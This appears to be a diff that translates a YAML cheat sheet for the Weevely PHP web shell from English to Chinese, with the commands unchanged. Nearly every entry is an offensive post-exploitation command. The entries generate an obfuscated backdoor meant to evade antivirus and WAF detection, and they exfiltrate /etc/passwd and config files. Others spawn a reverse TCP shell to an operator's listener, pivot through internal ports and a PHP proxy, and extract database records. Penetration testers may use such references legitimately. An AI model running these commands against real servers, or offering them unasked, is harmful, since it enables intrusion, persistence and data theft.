@@ -3,104 +3,90 @@ tags: [web, webshell, post-exploitation, pentest, backdoor, php, security, enume
 
 actions:
   # === GENERATION AND CONNECTION ===
-  - title: weevely - generate php agent
+  - title: weevely - 生成 PHP 代理
     desc: |
-      Generates a new polymorphic PHP agent with a custom password. 
-      The generated script is designed to be obfuscated to bypass signature-based antivirus and WAF detection. 
-      The password provided here will be required every time you want to connect to this specific shell.
+      使用自定义密码生成新的多态 PHP 代理。生成的脚本经过混淆设计，以绕过基于签名的杀毒软件和 WAF 检测。
+      每次连接此特定 Shell 时都需要在此提供的密码。
     command: "weevely generate {{password}} {{path|shell.php}}"
 
-  - title: weevely - connect to agent
+  - title: weevely - 连接到代理
     desc: |
-      Establishes an interactive session with a previously uploaded Weevely agent. 
-      You must provide the full URL where the agent is hosted and the password used during generation. 
-      Once connected, you enter a specialized shell environment that supports both system commands and internal modules.
+      与先前上传的 Weevely 代理建立交互式会话。你必须提供代理托管的完整 URL 以及生成时使用的密码。
+      连接后你将进入一个专门的 Shell 环境，同时支持系统命令和内部模块。
     command: "weevely {{url}} {{password}}"
 
-  - title: weevely - execute single command
+  - title: weevely - 执行单条命令
     desc: |
-      Executes a single system command or Weevely module on the target without opening an interactive session. 
-      This is highly useful for automation, scripting, or quick checks of the target environment. 
-      The session terminates immediately after the command output is returned to the local terminal.
+      在目标上执行单条系统命令或 Weevely 模块，而不打开交互式会话。这对于自动化、脚本编写或快速检查目标环境非常有用。
+      命令输出返回到本地终端后，会话立即终止。
     command: "weevely {{url}} {{password}} \"{{command|whoami}}\""
 
   # === FILE OPERATIONS ===
-  - title: weevely - list directory contents
+  - title: weevely - 列出目录内容
     desc: |
-      Lists files and directories in a specific path on the target server. 
-      It provides detailed information including permissions, owner, group, and modification time. 
-      This module is essential for navigating the remote filesystem and identifying sensitive configuration files.
+      列出目标服务器特定路径中的文件和目录。它提供详细信息，包括权限、所有者、组和修改时间。
+      此模块对于浏览远程文件系统以及识别敏感配置文件至关重要。
     command: "weevely {{url}} {{password}} :file_ls {{directory|/var/www/html}}"
 
-  - title: weevely - upload local file
+  - title: weevely - 上传本地文件
     desc: |
-      Uploads a file from your local machine to the remote target's filesystem. 
-      This is a critical operation for transferring additional exploitation tools, scripts, or lateral movement binaries. 
-      Ensure that the web server user has sufficient write permissions in the destination directory.
+      将文件从本机上传到远程目标的文件系统。这是传输额外利用工具、脚本或横向移动二进制文件的关键操作。
+      确保 Web 服务器用户在目标目录中有足够的写权限。
     command: "weevely {{url}} {{password}} :file_upload {{local_path}} {{remote_path}}"
 
-  - title: weevely - download remote file
+  - title: weevely - 下载远程文件
     desc: |
-      Downloads a file from the target server to your local machine. 
-      Commonly used for exfiltrating database configuration files, source code, or sensitive system files like /etc/passwd. 
-      Be cautious when downloading very large files as it may trigger network-based detection or timeout the request.
+      将文件从目标服务器下载到本机。常用于提取数据库配置文件、源代码或 /etc/passwd 等敏感系统文件。
+      下载超大文件时需谨慎，因为它可能触发基于网络的检测或导致请求超时。
     command: "weevely {{url}} {{password}} :file_download {{remote_path}} {{local_path}}"
 
-  - title: weevely - find files by name
+  - title: weevely - 按名称查找文件
     desc: |
-      Searches for files on the target filesystem based on name patterns or attributes. 
-      This is useful for locating specific configuration files (e.g., config.php, .env) or sensitive backups across the entire drive. 
-      The module helps in targeted data discovery without manually browsing every directory.
+      基于名称模式或属性在目标文件系统上搜索文件。这对于在整个磁盘上定位特定配置文件（如 config.php、.env）或敏感备份很有用。
+      该模块有助于有针对性地发现数据，而无需手动浏览每个目录。
     command: "weevely {{url}} {{password}} :file_find {{path|/var/www}} {{name|config.php}}"
 
   # === SYSTEM AUDIT AND ENUMERATION ===
-  - title: weevely - gather system information
+  - title: weevely - 收集系统信息
     desc: |
-      Collects comprehensive information about the target operating system, kernel version, and hardware architecture. 
-      This data is vital for selecting appropriate local privilege escalation exploits or understanding the OS environment. 
-      It also checks for available system binaries like python, perl, or gcc that can be used for further exploitation.
+      收集关于目标操作系统、内核版本和硬件架构的全面信息。这些数据对于选择合适的本地提权漏洞利用或理解操作系统环境至关重要。
+      它还会检查可用的系统二进制文件，如 python、perl 或 gcc，用于进一步利用。
     command: "weevely {{url}} {{password}} :system_info"
 
-  - title: weevely - audit filesystem permissions
+  - title: weevely - 审计文件系统权限
     desc: |
-      Audits the remote filesystem to find directories with weak or insecure permissions. 
-      It identifies world-writable folders or sensitive files that are readable by the web server user. 
-      This information is crucial for finding locations to hide backdoors or identifying misconfigurations.
+      审计远程文件系统，查找权限弱或不安全的目录。它识别全局可写的文件夹或 Web 服务器用户可读的敏感文件。
+      这些信息对于寻找隐藏后门的位置或识别错误配置至关重要。
     command: "weevely {{url}} {{password}} :audit_filesystem"
 
-  - title: weevely - read /etc/passwd
+  - title: weevely - 读取 /etc/passwd
     desc: |
-      Attempts to read the /etc/passwd file using various techniques to bypass potential restrictions. 
-      This file provides a list of system users, which is essential for password spraying or identifying high-privilege accounts. 
-      The module tries different methods in case standard file reading is blocked by security configurations.
+      尝试使用各种技术读取 /etc/passwd 文件，以绕过潜在限制。此文件提供系统用户列表，对于密码喷洒或识别高权限账户至关重要。
+      如果标准文件读取被安全配置阻止，该模块会尝试不同方法。
     command: "weevely {{url}} {{password}} :audit_etcpasswd"
 
   # === NETWORKING AND PIVOTING ===
-  - title: weevely - spawn reverse tcp shell
+  - title: weevely - 生成反弹 TCP Shell
     desc: |
-      Initiates a reverse TCP shell connection from the target back to your listener. 
-      This provides a more stable and fully interactive terminal compared to the request-response nature of a web shell. 
-      Make sure to have a listener like Netcat or Metasploit running on the specified IP and port before executing this command.
+      从目标向你的监听器发起反向 TCP Shell 连接。与 Web Shell 的请求-响应特性相比，这提供了更稳定、完全交互的终端。
+      在执行此命令前，确保在指定 IP 和端口上已运行 Netcat 或 Metasploit 等监听器。
     command: "weevely {{url}} {{password}} :backdoor_reversetcp {{ip}} {{port}}"
 
-  - title: weevely - internal port scan
+  - title: weevely - 内网端口扫描
     desc: |
-      Performs a TCP port scan on the internal network or the localhost from the perspective of the target server. 
-      This allows you to discover internal services that are not exposed to the public internet, such as databases or management interfaces. 
-      It is a key step for pivoting and moving laterally within the target's internal infrastructure.
+      从目标服务器的视角对内网或 localhost 执行 TCP 端口扫描。这使你能够发现未暴露到公共互联网的内部服务，如数据库或管理接口。
+      它是横向移动和进入目标内部基础设施的关键步骤。
     command: "weevely {{url}} {{password}} :net_scan {{target_ip|127.0.0.1}} {{ports|21,22,80,443,3306,5432}}"
 
-  - title: weevely - install php proxy
+  - title: weevely - 安装 PHP 代理
     desc: |
-      Installs a PHP-based proxy on the target server to tunnel traffic through it. 
-      This allows you to browse internal web applications or bypass firewalls by using the compromised server as a gateway. 
-      This module is particularly effective for accessing internal-only admin panels or development environments.
+      在目标服务器上安装基于 PHP 的代理，用于通过它隧道化流量。这使你可以浏览内部 Web 应用或通过将被攻陷的服务器用作网关来绕过防火墙。
+      该模块对于访问仅限内部的 admin 面板或开发环境特别有效。
     command: "weevely {{url}} {{password}} :net_phpproxy"
 
   # === DATABASE OPERATIONS ===
-  - title: weevely - interactive sql console
+  - title: weevely - 交互式 SQL 控制台
     desc: |
-      Provides an interactive SQL console to execute queries directly against a database reachable by the target. 
-      It supports multiple DBMS types and requires valid credentials to establish the connection. 
-      This is much faster than manual exploitation for extracting data or modifying database records once credentials are found.
+      提供交互式 SQL 控制台，直接对目标可达的数据库执行查询。它支持多种 DBMS 类型，并需要有效凭据来建立连接。
+      一旦找到凭据，这比手动利用更快地提取数据或修改数据库记录。
     command: "weevely {{url}} {{password}} :sql_console --user {{db_user}} --pass {{db_pass}} --host {{db_host|localhost}} --db {{db_name}}"
